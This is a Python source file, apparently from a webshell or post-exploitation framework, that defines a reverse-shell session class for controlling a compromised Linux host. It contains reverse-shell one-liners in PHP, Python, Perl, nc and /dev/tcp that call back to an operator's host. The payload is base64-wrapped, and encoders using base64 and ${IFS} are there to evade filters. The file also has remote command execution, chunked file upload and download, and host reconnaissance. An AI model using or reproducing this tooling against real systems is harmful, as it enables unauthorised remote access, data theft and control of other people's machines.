import asyncio
import typing as t
import logging
import base64
import shlex
import hashlib
import uuid

from ..core import exceptions, SessionInterface

from ..core.base import (
    register_session,
    Option,
    OptionGroup,
    DirectoryEntry,
    BasicInfoEntry,
)

from ..utils.random_data import random_string

logger = logging.getLogger("core.sessions.linux_cmd_oneliner")

REVERSE_SHELL_SESSION_TYPE = "REVERSE_SHELL"

WRAPPER_CODE = """
echo -n "{start1}""{start2}";({code}) {decoder};echo {stop}
"""

UPLOAD_FILE_CHUNK_CODE = 'file=$(mktemp); echo {chunk_b64} | base64 -d > "$file"; echo DONE "$file"'

UPLOAD_FILE_MERGE_CODE = 'cat {files} > {filepath}; rm {files}'

UPLOAD_FILE_CHECK_CODE = 'which md5sum >/dev/null || echo no_md5sum; md5sum {filepath}'

DOWNLOAD_FILE_CHUNK_CODE = 'tail -c +{offset} {filepath} | head -c {chunk_size} | base64 -w 0 || echo "#"FAILED'

GET_BASICINFO_CODE = 'for cmd in {cmds}; do echo "start$cmd|"$($cmd | base64 -w 0)"stop"; done'

REVERSE_SHELL_PAYLOAD = """
if command -v php > /dev/null 2>&1; then
  php -r '$sock=fsockopen("{host}",{port});$proc=proc_open("sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
  exit;
fi

if command -v python > /dev/null 2>&1; then
  python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("{host}",{port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
  exit;
fi

if command -v perl > /dev/null 2>&1; then
  perl -e 'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
  exit;
fi

if command -v nc > /dev/null 2>&1; then
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f
  exit;
fi

if command -v sh > /dev/null 2>&1; then
  /bin/sh -i >& /dev/tcp/{host}/{port} 0>&1
  exit;
fi
"""


def reverse_shell_payload(host: str, port: int):
    payload = REVERSE_SHELL_PAYLOAD.replace("{host}", host).replace("{port}", str(port))
    payload = base64.b64encode(payload.encode()).decode()
    payload = f"echo {payload} | base64 -d | sh"
    return payload


def shell_command(args: t.List[str]):
    """Quote a command or its arguments"""
    return " ".join(shlex.quote(arg) for arg in args)


def parse_file_permission(perm: str):
    result = ""
    for i in range(0, 9, 3):
        part = perm[i : i + 3]
        digit_bin = "".join("0" if c == "-" else "1" for c in part)
        result += str(int(digit_bin, 2))
    return result


@register_session
class ReverseShellSession(SessionInterface):
    session_type = REVERSE_SHELL_SESSION_TYPE
    readable_name = "Reverse Shell"
    conn_options: t.List[OptionGroup] = [
        {
            "name": "Advanced Connection",
            "options": [
                Option(
                    id="chunk_size",
                    name="Upload/Download chunk size",
                    type="text",
                    placeholder="Chunk size in bytes; recommended between 1KB and 1024KB",
                    default_value="1024",
                    alternatives=None,
                ),
                Option(
                    id="encoder",
                    name="Command encoder",
                    type="select",
                    placeholder="raw",
                    default_value="raw",
                    alternatives=[
                        {"name": "raw", "value": "raw"},
                        {"name": "base64_quote", "value": "base64_quote"},
                        {"name": "base64_ifs", "value": "base64_ifs"},
                    ],
                ),
                Option(
                    id="decoder",
                    name="Decoder",
                    type="select",
                    placeholder="raw",
                    default_value="raw",
                    alternatives=[
                        {"name": "raw", "value": "raw"},
                        {"name": "base64", "value": "base64"},
                    ],
                ),
            ],
        }
    ]

    def __init__(
        self,
        config: dict,
        drop_self: t.Callable[[], None],
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
    ):
        self.drop_self = drop_self  # remove self from connector
        self.chunk_size = int(config.get("chunk_size", 1024))
        self.encoder = str(config.get("encoder", "raw"))
        self.decoder = str(config.get("decoder", "raw"))
        self.reader = reader
        self.writer = writer
        self.lock = asyncio.Lock()

    async def execute_cmd(self, cmd: str):
        return await self.submit(cmd)

    async def test_usablility(self):
        toprint = random_string(12)
        return toprint in (await self.submit(["echo", toprint]))

    async def get_pwd(self):
        return (await self.submit("pwd")).strip()

    async def _list_dir(self, dir_path: str) -> t.Union[t.List[DirectoryEntry], None]:
        # list directory; if a file is given, return its file details

        # yes, we are parsing output of `ls`, although we shoudn't
        command_output = await self.submit(
            shell_command(["ls", "-la", dir_path]) + " && echo finished"
        )
        result = []
        if "finished" not in command_output:
            return None
        for line in command_output.splitlines():
            parts = line.split(maxsplit=8)
            if len(parts) < 9:
                continue
            perm = parts[0]
            filesize = parts[4]
            name = parts[8]  # it would be `aaa -> bbb` when it is symlink

            try:
                filesize = int(filesize)
            except Exception as exc:
                raise exceptions.FileError("Cannot parse file size") from exc

            filetype = perm[0]
            perm = parse_file_permission(perm[1:10])
            filetype = {"-": "file", "f": "file", "d": "dir", "l": "link"}.get(
                filetype, "unknown"
            )
            if filetype == "link":
                filetype = "link-dir" if name.endswith("/") else "link-file"
                name = name.split(" ->")[0]
            result.append(
                DirectoryEntry(
                    name=name,
                    permission=perm,
                    filesize=int(filesize),
                    entry_type=filetype,
                )
            )
        return result

    async def list_dir(self, dir_path: str) -> t.List[DirectoryEntry]:
        result = await self._list_dir(dir_path)
        if result:
            return result
        return [
            DirectoryEntry(name="..", permission="555", filesize=-1, entry_type="dir")
        ]

    async def mkdir(self, dir_path: str):
        result = await self.submit(
            shell_command(["mkdir", dir_path]) + " && echo finished"
        )
        if result.strip() != "finished":
            raise exceptions.FileError("Failed to create directory")

    async def get_file_contents(self, filepath: str, max_size: int = 1024 * 200):
        ls_result = await self.list_dir(filepath)
        if not ls_result or ls_result[0].filesize > max_size:
            raise exceptions.FileError(f"File too large (>{max_size}B); consider downloading to edit")
        content_b64 = await self.submit(["base64", "-w", "0", filepath])
        return base64.b64decode(content_b64)

    async def put_file_contents(self, filepath: str, content: bytes):
        content_b64 = base64.b64encode(content).decode()
        cmd = (
            f"{shell_command(['echo', content_b64])} | "
            + f"base64 -d > {shlex.quote(filepath)} && echo finished"
        )
        result = await self.submit(cmd)
        return result.strip() == "finished"

    async def delete_file(self, filepath: str):
        cmd = shell_command(["rm", filepath]) + " && echo finished"
        result = await self.submit(cmd)
        return result.strip() == "finished"

    async def move_file(self, filepath: str, new_filepath: str):
        cmd = shell_command(["mv", filepath, new_filepath]) + " && echo finished"
        result = await self.submit(cmd)
        if result.strip() != "finished":
            raise exceptions.FileError("Move failed")

    async def copy_file(self, filepath: str, new_filepath: str):
        cmd = shell_command(["cp", filepath, new_filepath]) + " && echo finished"
        result = await self.submit(cmd)
        if result.strip() != "finished":
            raise exceptions.FileError("Move failed")

    async def upload_file(
        self, filepath: str, content: bytes, callback: t.Union[t.Callable, None] = None
    ) -> bool:
        result_touch = await self.submit(
            shell_command(["touch", filepath]) + " && echo finished"
        )
        if result_touch.strip() != "finished":
            raise exceptions.FileError("Upload failed: cannot create file")

        write_state_lock = asyncio.Lock()
        chunk_size = self.chunk_size
        done_coro = 0
        done_bytes = 0
        coros: t.List[t.Awaitable] = []

        async def upload_chunk(chunk: bytes):
            nonlocal done_coro, done_bytes
            code = UPLOAD_FILE_CHUNK_CODE.format(
                chunk_b64=base64.b64encode(chunk).decode()
            )
            await asyncio.sleep(0.01)
            result = await self.submit(code)
            async with write_state_lock:
                done_coro += 1
                done_bytes += len(chunk)
                if callback:
                    callback(
                        done_coro=done_coro,
                        max_coro=len(coros),
                        done_bytes=done_bytes,
                        max_bytes=len(content),
                    )
            result = result.strip()
            if not result.startswith("DONE"):
                raise exceptions.FileError("Upload chunk failed")

            return result.removeprefix("DONE").strip()

        coros = [
            upload_chunk(content[i : i + chunk_size])
            for i in range(0, len(content), chunk_size)
        ]
        uploaded_chunks = await asyncio.gather(*coros)
        code = UPLOAD_FILE_MERGE_CODE.format(
            files=shell_command(uploaded_chunks), filepath=shlex.quote(filepath)
        )
        await self.submit(code)
        checkfile = await self.submit(
            UPLOAD_FILE_CHECK_CODE.format(filepath=shlex.quote(filepath))
        )
        if "no_md5sum" in checkfile:
            return True  # we cannot check it
        if hashlib.md5(content).hexdigest() not in checkfile:
            raise exceptions.FileError("Upload failed: MD5 verification failed")
        return True

    async def download_file(self, filepath: str, callback=None):
        ls_result = await self.list_dir(filepath)
        if not ls_result:
            raise exceptions.FileError("Cannot read file size; maybe file does not exist?")
        filesize = ls_result[0].filesize

        write_state_lock = asyncio.Lock()
        chunk_size = self.chunk_size
        done_coro = 0
        done_bytes = 0
        coros: t.List[t.Awaitable] = []

        async def download_chunk(offset: int):
            nonlocal done_coro, coros, done_bytes
            # offset starts at 1
            code = DOWNLOAD_FILE_CHUNK_CODE.format(
                offset=offset,
                filepath=shlex.quote(filepath),
                chunk_size=str(chunk_size),
            )
            await asyncio.sleep(0.01)  # we don't ddos
            result = await self.submit(code)
            async with write_state_lock:
                done_coro += 1
                done_bytes += chunk_size  # TODO: fix me
                if callback:
                    callback(
                        done_coro=done_coro,
                        max_coro=len(coros),
                        done_bytes=min(done_bytes, filesize),
                        max_bytes=filesize,
                    )
            if "#FAILED" in result:
                raise exceptions.FileError("Cannot read file")
            try:
                return base64.b64decode(result.strip())
            except Exception as exc:
                raise exceptions.FileError("Cannot base64-decode chunk") from exc

        coros = [download_chunk(i) for i in range(1, filesize + 1, chunk_size)]
        chunks = await asyncio.gather(*coros)
        return b"".join(chunks)

    async def open_reverse_shell(self, host: str, port: int) -> None:
        await self.submit(reverse_shell_payload(host, port))

    async def send_bytes_over_tcp(
        self,
        host: str,
        port: int,
        content: bytes,
        send_method: t.Union[str, None] = None,
    ) -> t.Union[bytes, None]:
        """Send bytes over TCP to another host with an optional method"""
        raise exceptions.ServerError(
            "This feature is not supported"
        )  # it could be done with nc or bash, but it's not implemented

    async def get_send_tcp_support_methods(self) -> t.List[str]:
        """Return supported TCP send methods"""
        return []

    async def get_basicinfo(self):
        # TODO: add more commands
        cmds = ["uname -a", "whoami", "id", "groups", "pwd"]
        info = GET_BASICINFO_CODE.format(cmds=shell_command(cmds))
        result = []
        for line in (await self.submit(info)).splitlines():
            line = line.strip().removeprefix("start").removesuffix("stop")
            if "|" not in line:
                continue
            cmd, output_b64 = line.split("|", maxsplit=1)
            try:
                output = base64.b64decode(output_b64.strip()).decode()
            except Exception:
                continue
            result.append(BasicInfoEntry(key=cmd, value=output))
        return result

    async def submit(self, payload: t.Union[str, t.List[str]]):
        start1, start2, stop = random_string(6), random_string(6), random_string(12)
        # we use f-string here because shell commands normally don't
        # has brackets unlike php code
        code = WRAPPER_CODE.format(
            start1=start1,
            start2=start2,
            code=payload if isinstance(payload, str) else shell_command(payload),
            stop=stop,
            decoder={"raw": "", "base64": "|base64 -w0"}.get(self.decoder, ""),
        )
        if self.encoder == "base64_quote":
            code = shell_command(
                [
                    "sh",
                    "-c",
                    "echo "
                    + base64.b64encode(code.encode()).decode()
                    + "|base64 -d|sh",
                ]
            )
        elif self.encoder == "base64_ifs":
            code = (
                "sh -c echo${IFS}"
                + base64.b64encode(code.encode()).decode()
                + "|base64${IFS}-d|sh"
            )
        elif self.encoder == "raw":
            pass
        else:
            raise exceptions.UserError("Unknown encoder: " + self.encoder)
        result = await self.submit_socket(code)

        if (start1 + start2) not in result:
            logger.debug(f"Command result: {result}")
            raise exceptions.PayloadOutputError(
                "Cannot find output start; maybe the webshell didn't run the code?"
            )
        result_body = result[result.index(start1 + start2) + len(start1 + start2) :]
        if stop not in result_body:
            raise exceptions.PayloadOutputError(
                "Cannot find output end; maybe the webshell didn't run the code?"
            )
        todecode = result_body[: result_body.index(stop)].removeprefix("\n")

        if self.decoder == "base64":
            # TODO: allow user defind target encoding
            return base64.b64decode(todecode).decode()
        if self.decoder == "raw":
            return todecode
        else:
            raise exceptions.UserError("Unknown decoder: " + self.decoder)

    async def submit_socket(self, payload: t.Union[str, bytes]):
        command_end_marker = str(uuid.uuid4())
        async with self.lock:
            if isinstance(payload, str):
                payload = payload.encode()
            try:
                self.writer.write(bytes(payload) + b"\n")
                self.writer.write(
                    f"echo '{command_end_marker[:6]}''{command_end_marker[6:]}'\n".encode()
                )
                await self.writer.drain()
                data = await self.reader.readuntil(
                    separator=command_end_marker.encode()
                )
                return data.decode()
            except ConnectionResetError as e:
                self.drop_self()  # notify connector to drop itself on connection error
                raise exceptions.NetworkError("Connection reset") from e
            except Exception as e:
                self.drop_self()  # notify connector to drop itself on other errors
                raise e
